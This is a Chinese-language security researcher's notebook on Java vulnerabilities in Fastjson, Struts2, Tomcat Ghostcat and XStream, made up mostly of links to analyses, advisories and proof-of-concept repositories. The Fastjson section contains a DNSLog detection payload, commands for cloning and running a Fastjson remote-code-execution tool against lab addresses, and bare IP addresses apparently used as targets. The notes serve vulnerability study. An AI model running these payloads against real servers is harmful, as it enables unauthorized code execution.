# java 漏洞

https://www.upguard.com/blog/top-10-java-vulnerabilities-and-how-to-fix-them
https://snyk.io/blog/162-security-vulnerabilities-disclosed-in-javas-top-10-libraries-including-jackson-spring-and-jetty/

## Fastjson

<!-- 
sec\udesk.sec.java.md
fastjson.20200325.md
-->

[Fastjson < 1.2.68版本反序列化漏洞分析篇](https://www.anquanke.com/post/id/219731)

[Fastjson68版本绕过autotype原理及利用场景分析](https://www.freebuf.com/vuls/240392.html)

[Fastjson <1.2.48 入门调试](https://www.anquanke.com/post/id/209915)

[Fastjson 1.2.24反序列化漏洞深度分析](https://www.anquanke.com/post/id/211035)

[Fastjson1.2.24漏洞复现详细过程](https://www.freebuf.com/articles/web/242712.html)

[不安全的序列化](https://www.freebuf.com/articles/web/244476.html)

[Fastjson批量检查及一键利用工具](https://www.freebuf.com/sectool/244113.html)

[fastjson<=1.2.62远程代码执行漏洞通告](https://www.anquanke.com/post/id/199527)

[CVE-2020-8840: FasterXML/jackson-databind 远程代码执行漏洞通告](https://www.anquanke.com/post/id/199519)

访问地址: 118.193.36.37:43170

{ "zeo": {"@type":"java.net.Inet4Address","val":"m9ng8n.dnslog.cn"]]
https://github.com/mrknow001/fastjson_rec_exploit
git clone git@github.com:mrknow001/fastjson_rec_exploit.git
118.89.54.172
python3 fastjson.py -u http://192.168.1.3/ -s 192.168.1.1 -c "touch /tmp/test.txt
python fastjson_rce_exploit.py -u http://192.168.56.107:8090/ -s 192.168.56.1 -c "touch /tmp/test.txt"

https://github.com/mrknow001/fastjson_rec_exploit/archive/master.zip

[vulhub](https://vulhub.org/)

[基础篇-XSS盲打](https://cloud.tencent.com/developer/article/1078996)


## Struts2

+ [x] Struts2 真的落后了吗? 是 https://github.com/apache/struts/releases 基本不更新了
+ [ ] 现在流行的又是什么? Spring+SpringMVC+Mybatis

Apache Struts 官方披 露S2-061 远程代码执行漏洞（ CVE-2020-17530 ）。
当开发人员强制使用OGNL解析时，某些特殊的TAG属性可能会被双重解析，进而导致远程代码执行。

参考链接： https://cwiki.apache.org/confluence/display/WW/S2-061

[内含POC丨漏洞复现之S2-061（CVE-2020-17530）](https://www.anquanke.com/post/id/225252)
[Struts2 S2-061漏洞分析(CVE-2020-17530)](https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g)


https://struts.apache.org/#
https://struts.apache.org/announce#a20201208

[Struts2-059 远程代码执行漏洞（CVE-2019-0230）分析](https://www.anquanke.com/post/id/216629)

Struts 2.3.24
https://archive.apache.org/dist/struts/2.3.24/struts-2.3.24-all.zip

TODO: idea创建 struts2项目: 应该需要升级idea
Failed to download 'http://central.maven.org/maven2/org/apache/struts/struts2-core/2.5.14.1/struts2-core-2.5.14.1.jar'
central.maven.org 这个域名已经没有了

        <url>https://repo1.maven.org/maven2</url>
https://stackoverflow.com/questions/62075914/intellij-create-sample-struts-web-project-with-java-then-show-this-error
because: "Beginning January 15, 2020, The Central Repository will no longer support communication over HTTP" (https://blog.sonatype.com/central-repository-moving-to-https)

[Struts2入门这一篇就够了](https://juejin.im/post/6844903573545811982)

## fastjson

[Fastjson历史漏洞研究（一）](https://www.anquanke.com/post/id/215753)

[FastJson历史漏洞研究（二）](https://www.anquanke.com/post/id/218268)

## Tomcat

### tomcat ghostcat Tomcat-Ajp

AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。
因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。

https://github.com/hypn0s/AJPy

[POC](https://github.com/0nise/CVE-2020-1938)

[tenable Nessus: CVE-2020-1938: Ghostcat](https://zh-cn.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487?tns_redirect=true)

[Apache Tomcat - AJP 'Ghostcat File Read/Inclusion](https://www.exploit-db.com/exploits/48143)

xray 长亭科技 tomcat ghostcat 扫描
https://www.chaitin.cn/zh/ghostcat

CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告
https://www.anquanke.com/post/id/199351

CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析
https://www.anquanke.com/post/id/199448

CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告
https://www.anquanke.com/post/id/199351

CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析
https://www.anquanke.com/post/id/199448

[Google Search XSS漏洞分析](https://www.anquanke.com/post/id/213422)
sanitize

### xstream

[20201214 CVE-2020-26258/26259：XStream 反序列化漏洞通告](https://www.anquanke.com/post/id/225489)
> [XStream 反序列化漏洞（CVE-2020-26258 & 26259）的复现与分析](https://www.anquanke.com/post/id/226241)
CVE-2020-26259 只要（运行 XStream 服务的）进程有足够的权限，那么当 XStream 在反序列化数据时，攻击者构造特定的XML/JSON 请求，可以造成任意文件删除。
CVE-2020-26258 运行 XStream 的服务在反序列化数据时，攻击者构造特定的 XML/JSON 请求，可以造成服务端请求伪造。

[20201119 XStream反序列化CVE-2020-26217漏洞分析](https://www.anquanke.com/post/id/222830)
[剖析xmlDecoder反序列化](https://www.anquanke.com/post/id/226575)
[Java安全之Shiro 550反序列化漏洞分析](https://www.anquanke.com/post/id/225442)
[以CVE-2020-8840为例分析Jackson漏洞](https://www.anquanke.com/post/id/226006)
[FastJson<=1.2.68RCE原理详细分析](https://www.anquanke.com/post/id/225439)
